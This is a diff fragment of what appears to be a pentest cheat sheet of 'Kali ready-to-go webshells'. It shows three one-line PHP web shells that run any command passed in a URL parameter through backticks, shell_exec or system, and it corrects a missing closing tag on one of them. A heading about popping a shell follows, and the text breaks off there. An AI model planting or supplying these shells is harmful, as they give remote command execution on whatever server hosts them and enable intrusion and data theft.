@@ -15,7 +15,7 @@ Kali ready-to-go webshells
 
 PHP code for a simple web shell:
 <?=`$_GET[0]`?>
-<?php echo shell_exec($_GET['cmd']); ?
+<?php echo shell_exec($_GET['cmd']); ?>
 <?php $cmd=$_GET['cmd']; system($cmd);?>
 
 PHP to immediately pop a shell
